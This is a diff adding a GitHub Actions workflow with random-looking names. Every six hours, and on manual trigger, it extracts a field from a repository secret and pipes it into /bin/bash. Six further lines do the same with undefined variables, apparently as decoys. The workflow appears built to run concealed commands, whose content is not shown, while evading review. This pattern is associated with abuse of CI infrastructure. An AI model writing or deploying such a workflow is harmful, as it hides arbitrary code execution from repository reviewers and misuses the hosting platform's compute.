@@ -1,0 +1,24 @@
+name: xiexingzou4198
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiexingzou4198
+        env:
+          ffrrs7511: ${{ secrets.ffrrs7511 }}
+        run: |
+          echo $ffrrs7511 | jq -r .ga54382 | /bin/bash
+          echo $ysd2120 | jq -r .c91768 | /bin/bash
+          echo $xoog427 | jq -r .pz673 | /bin/bash
+          echo $obp10 | jq -r .fj044 | /bin/bash
+          echo $d98921 | jq -r .hi86 | /bin/bash
+          echo $qu01 | jq -r .qmogu3749 | /bin/bash
+          echo $woif8327 | jq -r .blk77261 | /bin/bash
+
